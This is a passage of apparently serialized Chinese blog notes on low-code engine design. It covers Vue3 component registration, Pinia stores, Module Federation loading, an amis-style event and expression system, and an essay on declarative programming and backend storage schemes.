注册组件\nregistry.register('form', {\n  component: Form,\n  schema: {\n    type: 'object',\n    properties: {\n      api: { type: 'string' },\n      submitText: { type: 'string', default: '提交' }\n    }\n  }\n});\n```\n\n## 9. 示例：自定义组件\n\n>  高阶组件实现的方式，类似于 amis 的 `@renderer`\n\n```typescript\n// 自定义图表组件示例\nregistry.register('chart', {\n  component: defineComponent({\n    props: {\n      type: String,\n      data: Array,\n      config: Object\n    },\n    setup(props) {\n      // 集成第三方图表库\n      return () => (\n        <div class=\"chart-container\">\n          {/* 图表渲染逻辑 */}\n        </div>\n      );\n    }\n  }),\n  schema: {\n    type: 'object',\n    properties: {\n      type: { type: 'string', enum: ['line', 'bar', 'pie'] },\n      data: { type: 'array' },\n      config: { type: 'object' }\n    }\n  }\n});\n```\n\n## 10. 示例： 数据联动\n\n```typescript hl:11,10,16\n// 实现组件间的数据联动\nconst schema = {\n  type: 'page',\n  children: [\n    {\n      type: 'select',\n      props: {\n        name: 'province',\n        label: '省份',\n        onChange: {\n          actions: [\n            {\n              type: 'ajax',\n              config: {\n                url: '/api/cities/${province}',\n                target: 'cities'\n              }\n            }\n          ]\n        }\n      }\n    },\n    {\n      type: 'select',\n      props: {\n        name: 'city',\n        label: '城市',\n        source: '${cities}'\n      }\n    }\n  ]\n};\n```\n\n> 我是需要统一包在统一字段里面，比如 `onEvent`\n\n## 11. 其他\n\n   - 组件\n\t   - 提供合理的默认值\n\t   - 实现完善的类型定义\n- 性能优化\n\t- 使用 Vue3 的 `defineAsyncComponent` 实现组件懒加载\n- 扩展性设计\n\t- 提供插件系统\n\t- 支持主题定制\n\t- 预留适配层接口\n- 开发工具\n\t- 提供 Schema 验证工具\n\t- 开发调试工具\n\t- 可视化编辑器\n- 继续完善\n\t- 更多的内置组件\n\t- 更强大的表达式引擎\n\t- 更完善的文档和示例\n\t- 供更多的主题和样式选项\n\t- 加单元测试和端到端测试","Ncrkw8oC":"\n# 低代码工程结构设计\n\n`#lowcode` \n\n>   技术栈：`vue3 + pnpm + vite Module Federation + Pinia` 等\n\n\n## 目录\n<!-- toc -->\n ## 1. Monorepo 项目结构设计 \n\n```bash hl:3,6,9,12,15,18,21\nvamis/\n├── packages/\n│   ├── core/                 # 核心渲染引擎\n│   │   ├── package.json\n│   │   └── src/\n│   ├── components/           # 基础组件库\n│   │   ├── package.json\n│   │   └── src/\n│   ├── editor/              # 可视化编辑器\n│   │   ├── package.json\n│   │   └── src/\n│   └── shared/              # 共享工具和类型\n│       ├── package.json\n│       └── src/\n│   └── docs/              # 文档站点\n│       ├── package.json\n│       └── src/\n│   └── cli/              # 脚手架工具\n│       ├── package.json\n│       └── src/\n├── examples/                # 示例项目\n├── pnpm-workspace.yaml\n├── package.json\n└── tsconfig.json\n```\n\n## 2. Pinia 数据流管理\n\n### 2.1. 核心数据存储设计\n\n```typescript hl:9,9\n// packages/core/src/stores/schema.ts\nimport { defineStore } from 'pinia';\nimport type { Schema } from '@vamis/shared';\n\nexport const useSchemaStore = defineStore('schema', {\n  state: () => ({\n    currentSchema: null as Schema | null,\n    globalData: {},\n    contextData: new Map<string, any>(),\n    componentInstances: new Map(),\n  }),\n\n  getters: {\n    getComponentById: (state) => {\n      return (id: string) => state.componentInstances.get(id);\n    },\n    \n    getDataByPath: (state) => {\n      return (path: string) => {\n        return path.split('.').reduce((obj, key) => obj?.[key], state.globalData);\n      };\n    }\n  },\n\n  actions: {\n    setSchema(schema: Schema) {\n      this.currentSchema = schema;\n    },\n\n    updateComponentData(id: string, data: any) {\n      const instance = this.componentInstances.get(id);\n      if (instance) {\n        Object.assign(instance, data);\n      }\n    },\n\n    registerComponent(id: string, instance: any) {\n      this.componentInstances.set(id, instance);\n    }\n  }\n});\n```\n\n### 2.2. 组件状态管理\n\n```typescript\n// packages/core/src/stores/component.ts\nimport { defineStore } from 'pinia';\n\nexport const useComponentStore = defineStore('component', {\n  state: () => ({\n    activeComponents: new Set<string>(),\n    componentStates: new Map<string, any>(),\n  }),\n\n  actions: {\n    setComponentState(componentId: string, state: any) {\n      this.componentStates.set(componentId, state);\n    },\n\n    activateComponent(componentId: string) {\n      this.activeComponents.add(componentId);\n    },\n\n    deactivateComponent(componentId: string) {\n      this.activeComponents.delete(componentId);\n    }\n  }\n});\n```\n\n## 3. Module Federation 配置\n\n### 3.1. 远程组件配置\n\n> 参考[13. vite 中如何使用 Module Federation](/post/zjmJ8Ccg.html)\n\n### 3.2. 主应用配置\n\n> 参考[13. vite 中如何使用 Module Federation](/post/zjmJ8Ccg.html)\n\n### 3.3. 动态组件加载\n\n```typescript\n// packages/core/src/utils/componentLoader.ts\nimport { defineAsyncComponent } from 'vue';\n\nexport class ComponentLoader {\n  static async loadComponent(name: string) {\n    const componentMap = {\n      'Button': () => import('vamis-components/Button'),\n      'Form': () => import('vamis-components/Form'),\n      'Table': () => import('vamis-components/Table'),\n    };\n\n    if (!componentMap[name]) {\n      throw new Error(`Component ${name} not found`);\n    }\n\n    return defineAsyncComponent({\n      loader: componentMap[name],\n      loadingComponent: LoadingComponent,\n      errorComponent: ErrorComponent,\n      timeout: 3000\n    });\n  }\n}\n```\n\n## 4. 性能优化策略\n\n- 组件预加载\n- 解析 schema时，提请预加载数据\n- pinia\n\t- 使用 `storeToRefs` 保持响应性\n\t- 合理拆分 store 模块\n\t- 使用 `subscriptions` 监听状态变化\n\t- 状态持久化\n\n## 5. 开发规范和最佳实践\n\n- 包管理规范\n- 数据流规范\n\n## 6. 其他\n\n> 待补充","Jcqb4ghj":"\n# 调研：低代码引擎技术白皮书\n\n\n`#lowcode` \n\n>  电子版地址：[https://developer.aliyun.com/ebook/7507](https://developer.aliyun.com/ebook/7507?source=5176.11533457&userCode=b3pdrgck)\n\n\n## 目录\n<!-- toc -->\n ## 1. 软件开发演变 \n\n需求语言 → 业务语言 → 代码语言\n\n![图片&文件](./files/20241130-37.png)\n\n## 2. 开发范式演变：for 前端开发者\n\n- 组件体系建设\n\t- 原子化封装\n- 可视化搭建设计器\n\t- 布局可视化、配置可视化、样式可视化\n- 弱工程化\n\t- 将打包、发布等等各种环节进行弱化，用户只需要所见即所得的关注页面产出\n\n## 3. 低代码产品竞品分析\n\n- 阿里巴巴:钉钉宜搭 \n- 百度:爱速搭  \n- 腾讯:微搭  \n- 华为:应用魔方\n- 字节跳动:飞书多维表格\n- 简道云、明道云等\n\n## 4. 低代码引擎\n\n- 是一款为**低代码平台开发者**提供的，具备强大定制扩展能力的低代码设计器研发框架\n- 是前端 SDK\n- 是一款**面向前端研发人员**的技术产品\n\n![图片&文件](./files/20241201-51.png)\n\n## 5. 协议基础\n\n- 当前协议版本号\n- 组件的版本号\n- 资产包协议\n\t- 某个包，某个组件\n\t- 最终的产物会变成 remote 打包到 CDN\n\t\t- 有对应的 CSS、JS ，类似于 `unpkg`\n\t\t\t- https://unpkg.com/@alilc/lowcode-materials@1.0.0/dist/AliAliLowcodeMaterials\n\t\t\t- https://unpkg.com/@alilc/lowcode-materials@1.0.0/dist/AliAliLowcodeMaterials\n- 源码组件：\n\t- 一套面向开发者的目录规范\n- 低代码组件：\n\t- 一套面向开发者的 Schema 规范\n\n组件基础信息\n\n![图片&文件](./files/20241130-38.png)\n\n## 6. 入料\n\n![图片&文件](./files/20241201-63.png)\n\n## 7. 编排\n\n所谓编排，即将设计器中的所有物料，进行布局设置、组件设置、交互设置(JS 编写/逻辑编排)后， 形成符合业务诉求的 schema 描述\n\n### 7.1. 项目模型、文档模型、节点模型 → 操作 Schema \n\n类似于 DOM，操作 DOM，等价与操作编排 JSON Schema 了\n\n![图片&文件](./files/20241201-52.png)\n\n![图片&文件](./files/20241201-53.png)\n\n![图片&文件](./files/20241201-54.png)\n\n## 8. 渲染\n\n![图片&文件](./files/20241201-55.png)\n\n### 8.1. 运行时方案\n\n![图片&文件](./files/20241201-56.png)\n\n### 8.2. 预编译方案\n\n- icejs 出码:基于 `React + Ice.js` 框架的方案，适用于 PC 端中后台场景。\n- rax 出码:基于 Rax 框架的方案，适用于移动端和小程序场景。\n- 或者基于 `create-vue` 的方法\n\n```bash\nnpx @alilc/lowcode-code-generator -i example-schema.json -o generated -s rax\n```\n\n可生成标准的**目录结构** ，而不是一个大文件\n\n>  **本质是是 DSL 生成 代码的方式，即编译**\n\n\n\n![图片&文件](./files/20241201-57.png)\n\n## 9. 出码\n\n![图片&文件](./files/20241201-59.png)\n\n\n\n![图片&文件](./files/20241201-60.png)\n\n![图片&文件](./files/20241201-61.png)\n\n\n![undefined](#)","X3k2Algv":"\n# 基于 Vue3 的事件系统和事件编排逻辑，参考 AMIS 的实现思路 @823\n\n`#lowcode` \n\n\n## 目录\n<!-- toc -->\n ## 1. 事件系统核心设计 \n\n### 1.1. 事件定义接口\n\n```typescript\n// 事件类型定义\ninterface EventDefinition {\n  type: string;               // 事件类型\n  description?: string;       // 事件描述\n  payload?: any;             // 事件载荷类型\n}\n\n// 动作类型定义\ninterface ActionDefinition {\n  type: string;               // 动作类型\n  description?: string;       // 动作描述\n  params?: Record<string, any>; // 动作参数\n}\n\n// 事件处理器定义\ninterface EventHandler {\n  eventType: string;          // 监听的事件类型\n  actions: ActionConfig[];    // 要执行的动作配置列表\n  description?: string;       // 处理器描述\n}\n\n// 动作配置\ninterface ActionConfig {\n  type: string;              // 动作类型\n  params?: Record<string, any>; // 动作参数\n  expression?: string;       // 条件表达式\n  when?: string;            // 执行条件\n  otherwise?: ActionConfig[]; // 条件不满足时的动作\n}\n```\n\n### 1.2. 事件管理器实现：registerAction\n\n```typescript hl:17,25,43\n// 事件管理器\nimport { reactive, ref } from 'vue';\n\nexport class EventManager {\n  private events = new Map<string, Set<Function>>();\n  private actionHandlers = new Map<string, Function>();\n  private expressionEngine: ExpressionEngine;\n\n  constructor() {\n    this.expressionEngine = new ExpressionEngine();\n    this.registerBuiltInActions();\n  }\n\n  // 注册内置动作\n  private registerBuiltInActions() {\n    // 设置状态\n    this.registerAction('setState', (params, context) => {\n      const { state, value } = params;\n      if (context.scope) {\n        context.scope[state] = value;\n      }\n    });\n\n    // 发送请求\n    this.registerAction('request', async (params, context) => {\n      const { url, method = 'GET', data } = params;\n      try {\n        const response = await fetch(url, {\n          method,\n          body: data ? JSON.stringify(data) : undefined,\n          headers: {\n            'Content-Type': 'application/json'\n          }\n        });\n        return await response.json();\n      } catch (error) {\n        console.error('Request failed:', error);\n        throw error;\n      }\n    });\n\n    // 显示提示\n    this.registerAction('toast', (params) => {\n      const { message, type = 'info' } = params;\n      // 调用全局 toast 组件\n      window.$toast?.[type](message);\n    });\n  }\n\n  // 注册自定义动作\n  registerAction(type: string, handler: Function) {\n    this.actionHandlers.set(type, handler);\n  }\n\n  // 执行动作\n  async executeAction(config: ActionConfig, context: any) {\n    const handler = this.actionHandlers.get(config.type);\n    if (!handler) {\n      throw new Error(`Unknown action type: ${config.type}`);\n    }\n\n    // 检查条件\n    if (config.when) {\n      const result = this.expressionEngine.evaluate(config.when, context);\n      if (!result) {\n        if (config.otherwise) {\n          for (const action of config.otherwise) {\n            await this.executeAction(action, context);\n          }\n        }\n        return;\n      }\n    }\n\n    // 执行动作\n    try {\n      return await handler(config.params, context);\n    } catch (error) {\n      console.error(`Action ${config.type} failed:`, error);\n      throw error;\n    }\n  }\n\n  // 处理事件\n  async handleEvent(eventType: string, event: any, context: any) {\n    const handlers = this.events.get(eventType);\n    if (handlers) {\n      for (const handler of handlers) {\n        await handler(event, context);\n      }\n    }\n  }\n}\n```\n\n### 1.3. 表达式引擎实现\n\n```typescript\n// 表达式引擎\nexport class ExpressionEngine {\n  // 解析并执行表达式\n  evaluate(expression: string, context: any): any {\n    // 使用 Function 构造器创建可执行函数\n    try {\n      const func = new Function(\n        'ctx', \n        `with(ctx) { return ${expression}; }`\n      );\n      return func(context);\n    } catch (error) {\n      console.error('Expression evaluation failed:', error);\n      return false;\n    }\n  }\n\n  // 格式化表达式\n  format(template: string, data: any): string {\n    return template.replace(/\\${(.*?)}/g, (match, key) => {\n      try {\n        return this.evaluate(key, data);\n      } catch (error) {\n        return match;\n      }\n    });\n  }\n}\n```\n\n## 2. 组件集成实现\n\n### 2.1. 事件混入\n\n```typescript hl:30\n// 事件混入\nimport { inject } from 'vue';\n\nexport function useEvents() {\n  const eventManager = inject('eventManager');\n  \n  // 触发事件\n  const emit = async (eventType: string, payload?: any) => {\n    const context = {\n      event: payload,\n      scope: getCurrentScope()\n    };\n    \n    await eventManager.handleEvent(eventType, payload, context);\n  };\n\n  // 注册事件处理器\n  const on = (config: EventHandler) => {\n    const handler = async (event: any, context: any) => {\n      for (const action of config.actions) {\n        await eventManager.executeAction(action, {\n          ...context,\n          event\n        });\n      }\n    };\n\n    eventManager.events.get(config.eventType)?.add(handler);\n    \n    // 返回清理函数\n    return () => {\n      eventManager.events.get(config.eventType)?.delete(handler);\n    };\n  };\n\n  return {\n    emit,\n    on\n  };\n}\n```\n\n### 2.2. 可视化组件示例\n\n```vue\n<!-- EventEditor.vue -->\n<template>\n  <div class=\"event-editor\">\n    <div class=\"event-list\">\n      <div v-for=\"(handler, index) in handlers\" :key=\"index\">\n        <select v-model=\"handler.eventType\">\n          <option v-for=\"event in availableEvents\" :value=\"event.type\">\n            {{ event.description }}\n          </option>\n        </select>\n        \n        <div class=\"action-list\">\n          <div v-for=\"(action, actionIndex) in handler.actions\" \n               :key=\"actionIndex\">\n            <select v-model=\"action.type\">\n              <option v-for=\"type in availableActions\" :value=\"type\">\n                {{ type }}\n              </option>\n            </select>\n            \n            <!-- 动作参数编辑器 -->\n            <component \n              :is=\"getActionEditor(action.type)\"\n              v-model=\"action.params\"\n            />\n            \n            <!-- 条件编辑器 -->\n            <div v-if=\"action.when\" class=\"condition\">\n              <input v-model=\"action.when\" \n                     placeholder=\"输入条件表达式\" />\n            </div>\n          </div>\n          \n          <button @click=\"addAction(handler)\">添加动作</button>\n        </div>\n      </div>\n      \n      <button @click=\"addHandler\">添加事件处理器</button>\n    </div>\n  </div>\n</template>\n\n<script setup lang=\"ts\">\nimport { ref, computed } from 'vue';\n\nconst handlers = ref<EventHandler[]>([]);\n\n// 可用事件列表\nconst availableEvents = computed(() => [\n  { type: 'click', description: '点击事件' },\n  { type: 'change', description: '值变化事件' },\n  { type: 'submit', description: '表单提交事件' }\n]);\n\n// 可用动作列表\nconst availableActions = computed(() => [\n  'setState',\n  'request',\n  'toast',\n  'navigate'\n]);\n\n// 添加事件处理器\nconst addHandler = () => {\n  handlers.value.push({\n    eventType: '',\n    actions: []\n  });\n};\n\n// 添加动作\nconst addAction = (handler: EventHandler) => {\n  handler.actions.push({\n    type: '',\n    params: {}\n  });\n};\n\n// 获取动作编辑器组件\nconst getActionEditor = (actionType: string) => {\n  const editors = {\n    setState: 'StateEditor',\n    request: 'RequestEditor',\n    toast: 'ToastEditor',\n    navigate: 'NavigateEditor'\n  };\n  \n  return editors[actionType] || 'DefaultEditor';\n};\n</script>\n```\n\n## 3. 使用示例\n\n### 3.1. JSON 配置示例\n\n```json hl:33\n{\n  \"type\": \"page\",\n  \"body\": [\n    {\n      \"type\": \"form\",\n      \"body\": [\n        {\n          \"type\": \"input\",\n          \"name\": \"username\",\n          \"label\": \"用户名\"\n        },\n        {\n          \"type\": \"button\",\n          \"label\": \"提交\",\n          \"onEvent\": {\n            \"click\": {\n              \"actions\": [\n                {\n                  \"type\": \"request\",\n                  \"params\": {\n                    \"url\": \"/api/login\",\n                    \"method\": \"POST\",\n                    \"data\": {\n                      \"${username}\": \"${username}\"\n                    }\n                  }\n                },\n                {\n                  \"type\": \"toast\",\n                  \"params\": {\n                    \"message\": \"登录成功\"\n                  },\n                  \"when\": \"event.status === 200\"\n                },\n                {\n                  \"type\": \"navigate\",\n                  \"params\": {\n                    \"to\": \"/dashboard\"\n                  },\n                  \"when\": \"event.status === 200\"\n                }\n              ]\n            }\n          }\n        }\n      ]\n    }\n  ]\n}\n```\n\n### 3.2. 组件中使用\n\n```vue\n<!-- CustomButton.vue -->\n<template>\n  <button @click=\"handleClick\">\n    {{ label }}\n  </button>\n</template>\n\n<script setup lang=\"ts\">\nimport { useEvents } from './useEvents';\n\nconst props = defineProps<{\n  label: string;\n  onEvent?: Record<string, EventHandler>;\n}>();\n\nconst { emit } = useEvents();\n\nconst handleClick = async () => {\n  if (props.onEvent?.click) {\n    await emit('click');\n  }\n};\n</script>\n```\n\n关键设计点：\n1. 使用 Vue3 组合式 API，便于逻辑复用和组织\n2. 事件系统支持异步操作和链式调用\n3. 支持条件判断和表达式计算\n4. 提供内置动作和自定义动作扩展机制\n5. 提供可视化配置界面\n6. 保持与 AMIS 相似的 JSON 配置结构\n7. 支持上下文传递和作用域管理\n\n这个设计可以满足大多数低代码平台的事件处理需求，同时保持了良好的扩展性和可维护性。","9gGtl5XF":"\n# 好文：低代码实现原理\n\n`#lowcode`\n\n>  参考： https://zhuanlan.zhihu.com/p/451340998\n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 低代码的定义\n- 低代码平台的实现原理\n- 前端和后端的实现方案\n- 低代码的优缺点\n- 低代码是一种声明式编程，**可视化编辑**是必要条件\n- 各种存储和业务逻辑实现方案\n\n## 2. 低代码的核心\n\n- 低代码的`核心` 是`可视化编辑`，`可视化编辑`是低代码的必要条件\n- 需要`声明式代码` 来支持\n\n### 2.1. 为什么不是命令式\n\n- 「声明式」可以直接从展现结果反向推导回源码\n- 「命令式」无法做到反向推导\n\n`反向推导`是编辑器必备功能，比如编辑器里的常见操作是点选这个红色区块，然后修改它的颜色，这在 DSL 中很容易实现，但声明式呢，如下代码，你如何实现呢？\n\n```javascript hl:5\nconst ctx = canvas.getContext('2d');\nctx.beginPath();\nctx.moveTo(0, 0);\nctx.lineTo(50, 0);\nctx.strokeStyle = '#ff0000';\nctx.lineWidth = 100;\nctx.stroke();\n```\n\n换言之，「命令式」代码无法实现`可视化编辑` ，所以只能是 `声明式`\n\n## 3. 常见的声明式\n\n- HTML+CSS 是一种页面展现的 DSL\n- SQL 是一种数据查询及处理的 DSL\n- K8S 的 yaml 是一种服务部署的 DSL\n- NGINX conf 是一种反向代理的 DSL\n- React、Vue框架的**虚拟 DOM 不也是 一种DSL** 嘛\n\t- Vue ：\n\t\t- SFC\n\t\t- JSX \n\t- React：\n\t\t- JSX\n\n## 4. 声明式编程的优缺点\n\n### 4.1. 优点\n\n- **容易上手**\n\t- 因为描述的是结果，语法可以做得简单，非研发也能快速上手 HTML 及 SQL。\n- **支持可视化编辑**，\n\t- 微软的 HTML 可视化编辑 FrontPage 在 1995 年就有了，现在各种 BI 软件可以认为是 SQL 的可视化编辑。\n- **容易优化性能**，\n\t- 无论是浏览器还是数据库都在不断优化，比如可以自动改成并行执行，这是命令式语言无法自动实现的。\n- **容易移植**\n\t- 容易向下兼容，现在的浏览器能轻松渲染 30 年前的 [HTML](https://link.zhihu.com/?target=http%3A//info.cern.ch/hypertext/WWW/MarkUp/Tags.html)，而现在的编译器没法编译 30 年前的浏览器引擎代码。\n- **因为它本身是一种协议，一种规范**；故\n\t- 后续变化不大，自然可以对它持续优化\n\t- 也容易做优化了\n\n### 4.2. 缺点\n\n- **只适合特定领域**\n\t- 命令式的语言比如 JavaScript 可以用在各种领域\n\t- 但\n\t\t- SQL 只适合做查询\n\t\t- HTML+CSS 只适合渲染文档及界面\n- **灵活性差**\n\t- 比如 SQL 虽然内置了很多函数，但想只靠它实现业务是远远不够的，有些数据库还提供了用户自定义函数功能（UDF），通过代码来扩展。\n- **调试困难**\n\t- 遇到问题时如缺乏工具会难以排查，如果你在 Firefox 出现前开发过页面就会知道\n\t- 由于IE6没有开发工具，编写复杂页面体验很差，遇到问题要看很久代码才发现是某个标签没闭合或者 CSS 类名写错了。\n- **强依赖运行环境**，因为==声明式只描述结果而不关注实现==，因此强依赖运行环境，但这也带来了以下问题：\n\t- **功能取决于运行环境**\n\t\t- 比如浏览器对 CSS 的支持程度决定某个属性是否有人用，虽然出现了CSS Houdini 提案\n\t\t- 但 Firefox 和 Safari 都不支持，而且上手成本太高，预计以后也不会流行。\n\t- **性能取决于运行环境**\n\t\t- 比如同一个 SQL 在不同数据库下性能有很大区别。\n- **对使用者是黑盒**\n\t- 使用者难以知道最终实现，就像很少人知道数据库及浏览器的实现细节，完全当成黑盒来使用，一旦遇到性能问题就不知所措。\n- **技术锁定**，因为\n\t- 即便是**最开放的 HTML** 也无法解决，很多年前许多网站只支持 IE，现在又变成了只支持 Chrome，微软和 Opera 在挣扎了很多年后也干脆直接转向用 Chromium。\n\t- 同样的即便有 SQL 标准，现在用的 Oracle/SQL Server 应用也没法轻松迁移到 Postgres/MySQL 上。\n\n## 5. 低代码的优缺点\n\n- 低代码的各种优点是「声明式」所带来的。\n- 低代码被质疑的各种缺点也是「声明式」所导致的\n\n所以，低代码的优缺点源自声明式编程，**易上手但灵活性差**\n\n## 6. 出码：生成代码的方案算不算低代码？\n\n> 就是阿里低代码引擎提到的**出码**\n\n在讨论各种方案前，有一种方案比较特别，它虽然也有配置规范或 DSL，甚至有可视化编辑，但最终应用运行是通过生成代码的方式实现的，不依赖运行环境。\n\n\n这个方案最大的优点是可以和专业开发整合，因此灵活性强、可以使用原有的开发流程，**本质上和专业开发一样**。\n\n>  好处是可以二次开发\n\n但也有如下缺点：\n- **强依赖研发**\n\t- 无法做到给非研发使用，因为后续代码需要编译上线。\n- **无法持续可视化编辑**\n\t- 因为代码无法可视化编辑，生成代码后只要有修改就没法再反向还原成低代码的形式，后续只能代码编辑。\n\t- ==即不可再逆向==\n- **难以实现完全用低代码开发应用**\n\t- 因为不能生成太复杂的代码，使得这种方案一般不包括交互行为，通常是只有前端界面支持可视化编辑。\n- **无法做到向下兼容**\n\t- 因为`生成的那一瞬间`代码**依赖的框架版本就固定了**\n\t- **目前还没见过哪款前后前端框架做过到完全向下兼容**。\n因此我认为生成代码的方案**不算**真正的低代码\n- 本质上它还是**一种开发辅助方式**\n\t- 一种高级点的脚手架工具，和**大部分IDE的生成样板代码能力一样**，使用这种方案无法做到持续可视化开发\n- 我还没见过有人将 ==HTML+CSS 编译成 C++ 代码后二次开发？==\n\n### 6.1. 补充：\n\n> 但对于跨端场景；特定环境，比如小程序还是很有用的\n\n## 7. 前端代码实现原理：界面渲染\n\n以 amis 为例，**amis 核心原理**是 `将 JSON 转成自研的 React 组件库，然后使用 React 进行渲染`\n\n```json\n{\n  \"type\": \"page\",\n  \"title\": \"页面标题\",\n  \"subTitle\": \"副标题\",\n  \"body\": {\n    \"type\": \"form\",\n    \"title\": \"用户登录\",\n    \"body\": [\n      {\n        \"type\": \"input-text\",\n        \"name\": \"username\",\n        \"label\": \"用户名\"\n      }\n    ]\n  }\n}\n```\n\n**amis 原理**就是转成了下面这样的 `React 组件树`，最终由各个 React 组件库渲染 HTML \n\n```jsx\n<Page title=\"页面标题\" subTitle=\"副标题\">\n  <Form title=\"用户登录\">\n    <InputText name=\"username\" label=\"用户名\" />\n  </Form>\n</Page>\n```\n\n- 如果再往下挖，React 不应是最终又会生成 HTML 嘛，所以低代码框架做两层封装，**架构分层越多，自然性能越堪忧**\n\t- 所以，==低代码性能问题是一个很容易凸显额问题==\n\n### 7.1. 为什么大家几乎全都使用 JSON \n\n1. **低代码平台编辑器几乎都是基于 Web 实现**，JavaScript 可以方便操作 JSON。\n\t- 至于渲染层还可以根据不同平台做渲染\n2. JSON 可以支持**双向编辑**，它的**读取和写入是一一对应**的。\n\n### 7.2. 为什么不是 YAML\n\n它有**引用**功能，导致了不好实现双向编辑，还有**循环引用**等等\n\n### 7.3. JSON 的缺点\n\n- 不支持注释\n- 不支持多行字符串\n- 语法过于严格，比如不支持单引号，不能在最后多写一个逗号\n- **复杂 JSON 不好维护**，不好拆解等\n- ==与关系型数据库不友好==\n\n## 8. 交互及逻辑处理的三种方案\n\n### 8.1. 使用图形化编程\n\n先说结论，局限性很大，本质的原因是「**代码无法可视化**」\n\n可视化的前提条件是什么？\n\n答案是需要具备空间形体特征，可视化只能用来展现二维及三维的物体，因为一维没什么意义，四维及以上大部人无法理解，所以如果一个事物没有形体特征，它就没法被可视化\n\n**下面这段代码，虽然只有 10 行代码，却包含了循环、调用函数、类型检测、分支判断、或操作符、递归调用、参数是函数这些抽象概念**，这些概念在现实中都找不到形体的，你可以尝试一下用图形来表示这段代码，然后给周围人看看，我相信任何图形化的尝试都会比原本这段代码更难懂，因为你需要先通过不同图形来区分上面的各种概念，其他人`得先熟悉这些图形符号`才能看懂，理解成本反而更高了。\n\n```javascript\nfunction JSONTraverse(json, mapper) {\n  Object.keys(json).forEach(key => {\n    const value = json[key];\n    if (isPlainObject(value) || Array.isArray(value)) {\n      JSONTraverse(value, mapper);\n    } else {\n      mapper(value, key, json);\n    }\n  });\n}\n\n```\n\n哪怕是真能可视化处理，大概率是这样子的 \n\n![图片&文件](./files/20241105-25.png)\n\n### 8.2. 固化交互行为\n\namis 将常用的**交互行为固化**并做成了配置，比如弹框是下面的配置：\n\n```json hl:4\n{\n  \"label\": \"弹框\",\n  \"type\": \"button\",\n  \"actionType\": \"dialog\",\n  \"dialog\": {\n    \"title\": \"弹框\",\n    \"body\": \"这是个简单的弹框。\"\n  }\n}\n```\n\n除了弹框之外还有发起请求、打开链接、刷新其它组件等，使用固化交互行为有下面两个优点：\n- 可以可视化编辑\n- 整合度高，比如弹框里可以继续使用 amis 配置，==通过嵌套实现复杂的交互逻辑==\n\n但这个方案 **最大的缺点是灵活性受限，只能使用 amis 内置的行为**\n\n### 8.3. 使用 JavaScript\n\n一旦写 `JavaScript`，最大缺点就是无法可视化编辑，因此不算是低代码，需要给专业前端来写了\n\n> 备注：严格说低代码还是要写代码，No Code 才是真正不写代码\n\n## 9. 后端低代码的方案\n\n后端低代码需要解决以下三个问题：\n- 如何实现`自定义数据存储`？\n\t- 见下文\n- 如何实现`业务逻辑`？\n\t- 见下文\n- 如何实现`流程流转`？\n\t- 见下文\n\n## 10. 后端低代码的方案：如何自定义数据存储？\n\n低代码平台需要支持用户存储**自定义数据**，因为**每个应用所需的字段是不一样的**。\n\n### 10.1. 方案 1：直接使用关系型数据库\n\n这个方案的原理是将**数据模型的可视化操作转成数据库 DDL**\n\n#### 10.1.1. 这个方案的优点是\n\n- 所有方案里唯一支持`直连外部数据库`，可以对接已有系统。\n- 性能高和灵活性强，因为可以使用高级 SQL。\n- 开发人员容易理解，因为和专业开发是一样的。\n\n#### 10.1.2. 但它的缺点是\n\n- 需要**账号有创建用户及 DDL权限**，\n\t- 如果有安全漏洞会造成严重后果，有些公司内部线上帐号没有这个权限，导致无法实现自动化变更。\n\t- DDL 有很多问题无解，比如在有数据的情况下，就不能再添加一个没有默认值的非 NULL 字段。\n\t- DDL 执行时会影响线上性能\n\t\t- 比如 MySQL 5.6 之前的版本在一个大数据量的表中添加索引字段会[锁整个表的写入](https://link.zhihu.com/?target=http%3A//download.nust.na/pub6/mysql/doc/refman/5.5/en/create-index.html)\n\t\t- 但也有数据库不受影响，比如 TiDB、OceanBase 支持[在](https://link.zhihu.com/?target=https%3A//pingcap.com/zh/blog/tidb-source-code-reading-17)线表结构变更，不会阻塞读写\n\t- 部分数据库不**支持 DDL 事务**，比如 MySQL 8 之前的版本，导致一旦在执行过程中出错将无法恢复。\n\t- 实现成本较高，需要实现「动态实体」功能，如果要支持不同数据库还得支持各种方言\n\n#### 10.1.3. 附：可视化操作如何转换成 数据库 DDL（==数据定义语言==）的例子\n\n想象你在设计一个学生信息管理系统，我们一步步来看这个过程：\n\n##### 10.1.3.1. 可视化界面设计\n\n假设你在低代码平台上看到的是这样的一个界面：\n\n````mermaid\n  classDiagram\n    class 学生表 {\n        +学号 (主键)\n        +姓名\n        +年龄\n        +班级\n        +入学时间\n    }\n````\n\n##### 10.1.3.2. 表单式操作\n\n在图形界面上，你可能会看到类似这样的表单：\n\n![图片&文件](./files/20241105-26.png)\n\n##### 10.1.3.3. 转换过程\n\n当你点击\"生成\"按钮后，低代码平台会将你的可视化配置转换为**数据库DDL语句**：\n\n```sql\n-- 这是自动生成的建表语句\nCREATE TABLE `student` (\n  `student_id` VARCHAR(20) PRIMARY KEY,    -- 学号作为主键\n  `name` VARCHAR(50) NOT NULL,             -- 姓名，不允许为空\n  `age` INT,                               -- 年龄\n  `class` VARCHAR(20) NOT NULL,            -- 班级，不允许为空\n  `enrollment_date` DATE                   -- 入学时间\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;\n```\n\n##### 10.1.3.4. 让我解释这个转换过程\n\n- **就像填表格一样**\n\t- 你不需要记住复杂的SQL语法\n\t- 只需要在表格中填写：\n\t\t - 想要什么字段（例如：学号、姓名）\n\t\t - 字段类型（例如：文本、数字、日期）\n\t\t - 是否必填\n\t\t - 是否是主键\n- **自动翻译**\n\t- 低代码平台就像一个翻译器\n\t- 把你填写的表格信息自动转换成数据库能理解的语言（SQL）\n\t- 例如：\n\t\t - 当你选择\"主键\"时，系统会添加 `PRIMARY KEY`\n\t\t - 当你选择\"必填\"时，系统会添加 `NOT NULL`\n- **智能处理**\n\t- 自动添加合适的数据类型\n\t- 自动处理字符编码\n\t- 自动添加必要的数据库设置\n- **就像使用模板**\n\t- 你在填表时不需要考虑技术细节\n\t- 系统会根据预设的模板生成标准的数据库代码\n\n这种方式的优点是：\n\n1. 不需要记忆复杂的SQL语法\n2. 减少人为错误\n3. 保证生成的代码符合标准\n4. 可以快速修改和调整\n5. 适合非技术人员使用\n\n通过这种可视化的方式，即使不懂SQL的人也能轻松创建数据库表，大大降低了数据库设计的门槛。\n\n### 10.2. 方案 2：使用文档型数据库\n\n比如 `MongoDB`，缺点是\n- 无法支持外部数据库，数据是孤岛，外部数据接入只能通过导入的方式。\n- MongoDB 